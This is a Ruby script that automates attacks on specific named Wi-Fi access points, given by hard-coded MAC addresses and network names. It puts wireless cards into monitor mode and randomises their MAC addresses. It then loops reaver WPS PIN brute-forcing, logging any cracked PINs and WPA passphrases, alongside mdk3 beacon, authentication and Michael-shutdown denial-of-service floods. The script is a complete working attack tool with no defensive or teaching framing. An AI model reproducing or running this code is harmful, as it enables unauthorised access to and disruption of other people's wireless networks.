#!/usr/bin/env ruby

require 'open3'
#on reboot stuff.

device="wlan2"
channel="8"
ap_mac="4C:60:DE:31:C3:79"
essid="NETGEAR34"
`ifconfig #{device} down`
`iwconfig #{device} mode monitor`
`ifconfig #{device} up`

#will not launch until the While true: at bottem
#reaver attack and log
def reaver(device, channel, ap_mac)
    Thread.start{
    puts "Random mac..."
    Open3.popen3("ifconfig #{device} down")
    Open3.popen3("macchanger #{device} -r")
    Open3.popen3("ifconfig #{device} up")
	Open3.popen3("reaver -i #{device} -vv --dh-small -b #{ap_mac} -c #{channel}"){|i,o,t|
	    i.puts("y")  #tell reaver Yes to continue where the attack left off
	    while line=o.gets
		#Log all reaver output to a file
		puts line
		log_all=File.open("log_all_#{ap_mac}",'a')
		log_all.puts(line)
		log_all.close

		#100.00% complete
		#Pin cracked in
		#WPS PIN: '12345678'
		#WPA PSK: 'asshole'
		#AP SSID: 'noob'
		# Log success to another file
		if line.include?("100.00%") || line.include?("Pin cracked") || line.include?("WPS PIN:") || line.include?("WPA PSK:") || line.include?("AP SSID:")
		    success=File.open("sucess_#{ap_mac}",'a')
		    success.puts(line)
		    success.close
		end
	    end
	}
    } #thread.start
end


 


#will not launch until the While true: at bottem
def mdk3(device, channel, ap_mac, essid)
    Thread.start{Open3.popen3("mdk3 #{device} b -n #{essid} -g -w -m -c #{channel}"){|i,o,t| while line=o.gets; puts line; end } }
    Thread.start{Open3.popen3("mdk3 #{device} a -i #{ap_mac} -m -s 1024"){|i,o,t| while line=o.gets; puts line; end } }
    Thread.start{Open3.popen3("mdk3 #{device} m -t #{ap_mac} -j -w 1 -n 1024 -s 1024"){|i,o,t| while line=o.gets; puts line; end } }
    Thread.start{Open3.popen3("mdk3 #{device} b -n #{essid} -g -w -m -c #{channel}"){|i,o,t| while line=o.gets; puts line; end } }
    Thread.start{Open3.popen3("mdk3 #{device} w -e #{essid} -c #{channel}"){|i,o,t| while line=o.gets; puts line; end } }
end

#the main reason for this script
# if you let reaver run for to long, it may hang with out any data output (frozen state)... so killall and restart
#just added a few extra dos attacks

#reaver -i #{device} -vv --dh-small -b 20:76:00:1C:D9:C8 -c 6
#reaver -i wlan2 -vv --dh-small -b 4C:60:DE:31:C3:79 -c 8
while true

    #reaver(device, channel, ap_mac)
    reaver("wlan2", "6", "20:76:00:1C:D9:C8")
    reaver("wlan0", "8", "4C:60:DE:31:C3:79")

    #run for 10 minutes, then restart
    sleep 10*60
    `killall reaver`

    #mdk3(device, channel, ap_mac, essid)
    mdk3("wlan2", "6", "20:76:00:1C:D9:C8", "myqwest4681")
    mdk3("wlan0", "8", "4C:60:DE:31:C3:79", "NETGEAR34")
    sleep 2*60
    `killall mdk3`

end